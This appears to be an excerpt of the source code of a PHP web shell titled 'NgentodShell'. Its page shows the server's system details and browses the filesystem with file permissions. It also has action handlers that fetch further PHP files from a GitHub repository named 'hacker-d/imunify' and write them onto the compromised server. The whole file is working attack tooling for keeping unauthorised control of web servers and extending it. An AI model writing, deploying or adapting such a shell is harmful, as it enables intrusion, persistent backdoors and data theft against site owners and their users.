...
<head>
    ...
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Rock+Salt&display=swap" rel="stylesheet">
    <style>
        body {
...
function permissionToRWX($permission) {
    $rwx = array('-', 'x', 'w', 'wx', 'r', 'r-x', 'rw-', 'rwx');
    $permission = substr(sprintf('%o', $permission), -3);
    $rwx_permissions = '';
    for ($i = 0; $i < strlen($permission); $i++) {
        $rwx_permissions .= $rwx[$permission[$i]];
    }
    $is_accessible = is_readable(PATH) && is_writable(PATH) && is_executable(PATH);
    $color = $is_accessible ? 'green' : 'red';
    return "<span style='color: $color;'>$rwx_permissions</span>";
}
echo "<div style='margin-bottom: 0px; margin-left: 0px;'>";
echo "<p style='font-size: 14px; color: white;'>Uname : <span style='color: lime;'>".php_uname('a')."</span></p>";
echo "</div>";
...
echo "<div style='text-align: center; margin-bottom: 0px; margin-top: 0px;'>
        <h1 class='creepster-regular'>NgentodShell</h1>
      </div>";
...
foreach ($paths as $id => $dir_part) {
    if ($dir_part == '' && $id == 0) {
        $a = true;
        echo "<a href=\"?p=/\" style='color: white; text-decoration: none;'><i class='fa fa-hdd'></i> : /</a>";
        continue;
    }
...
if (isset($_GET['p'])) {
    ...
    foreach ($folders as $folder) {
        echo "<div class='custom-select'>
                <tr>
                    ...
                    <td><center>" . permissionToRWX(fileperms(PATH . "/" . $folder)) . "</center></td>
                    <td><center>
    ...
    foreach ($files as $file) {
        echo "    <tr>
                    ...
                    <td><center>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</center></td>
                    <td><center>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</center></td>
                    <td><center>" . permissionToRWX(fileperms(PATH . "/" . $file)) . "</center></td>
                    <td><center>
                        <select onchange='location = this.value;'>
                            <option value=''>Select</option>
...
if (isset($_GET['action'])) {
    if ($_GET['action'] == 'download_wp22') {
        $url = 'https://raw.githubusercontent.com/hacker-d/imunify/main/wp-22.php';
        $file_name = PATH . '/wp-22.php';
        $content = file_get_contents($url);
        if ($content !== false) {
            file_put_contents($file_name, $content);
            echo "<p>wp-22.php has been downloaded to " . htmlspecialchars($file_name) . ".</p>";
        } else {
            echo "<p>Failed to download wp-22.php.</p>";
        }
    }
    if ($_GET['action'] == 'download_style') {
        $url = 'https://raw.githubusercontent.com/hacker-d/imunify/main/style.php';
        $file_name = PATH . '/style.php';
        $content = file_get_contents($url);
        if ($content !== false) {
            file_put_contents($file_name, $content);
            echo "<p>style.php has been downloaded to " . htmlspecialchars($file_name) . ".</p>";
        } else {
            echo "<p>Failed to download style.php.</p>";
        }
    }
}
?>
